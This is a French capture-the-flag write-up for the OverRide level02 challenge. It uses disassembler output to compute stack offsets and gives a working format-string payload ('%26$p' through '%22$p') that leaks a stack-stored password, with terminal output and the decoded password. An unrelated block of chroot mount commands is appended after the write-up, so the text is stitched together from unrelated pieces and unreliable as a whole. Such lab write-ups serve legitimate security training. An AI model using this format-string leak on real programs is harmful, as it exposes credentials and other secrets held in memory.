## Solution

Dans le code source on peu constater plusieur point :

un printf mal formater est utiliser, il affiche la variable local_78
la variable local_a8 contient le mot de passe du level3

On va donc essayer d'exploiter printf pour afficher la variable local_a8 :

```
    undefined8 __stdcall main(void)
    undefined8        RAX:8          <RETURN>
    undefined8        Stack[-0x10]:8 local_10                                XREF[5]:     00400889(W), 
    004008ad(W), 
    004008b1(R), 
    004008ed(R), 
    0040097d(R)  
    undefined4        Stack[-0x14]:4 local_14                                XREF[3]:     00400891(W), 
    00400906(W), 
    00400925(R)  
    undefined4        Stack[-0x78]:4 local_78                                XREF[6]:     0040082c(*), 
    00400843(*), 
    004009cd(*), 
    004009de(*), 
    00400a71(*), 
    00400a96(*)  
    undefined1        Stack[-0xa8]:1 local_a8                                XREF[5]:     00400849(*), 
    00400863(*), 
    004008e6(*), 
    00400909(*), 
    00400a51(*)  
    undefined4        Stack[-0x118   local_118                               XREF[5]:     00400869(*), 
    00400883(*), 
    00400a10(*), 
    00400a24(*), 
    00400a4a(*)  
    undefined4        Stack[-0x11c   local_11c                               XREF[1]:     0040081f(W)  
    undefined8        Stack[-0x128   local_128                               XREF[1]:     00400825(W)  
```

Ici local_a8 est a a8 de distance avec le haut de la stack 
a8 = 168 bytes de distance
168 / 8 (ou 4 sur architecture de 32bits) = 21

21 + 5 (les argument de l'appel de printf) = 26

le mot de passe fait fait une taille de 0x29 donc 41 en decimal, ce qui fait 5 print 

### Payload
```
%26$p %25$p %24$p %23$p %22$p
```
```
----------------------------------------------------------------
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %26$p %25$p %24$p %23$p %22$p    
--[ Password: 
*****************************************
0x48336750664b394d 0x354a35686e475873 0x377a7143574e6758 0x45414a3561733951 0x756e505234376848 does not have access!
```

On retire les 0x et les espace :
```
48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848 -> in ASCII -> H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
```
on inverse et cela donne :
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```



mount -v --bind /dev /mnt/uefi.fs/dev
mount -vt devpts devpts -o gid=5,mode=0620 /mnt/uefi.fs/dev/pts
mount -vt proc proc /mnt/uefi.fs/proc
mount -vt sysfs sysfs /mnt/uefi.fs/sys
mount -vt tmpfs tmpfs /mnt/uefi.fs/run
if [ -h /mnt/uefi.fs/dev/shm ]; then
  install -v -d -m 1777 /mnt/uefi.fs$(realpath /dev/shm)
else
  mount -vt tmpfs -o nosuid,nodev tmpfs /mnt/uefi.fs/dev/shm
fi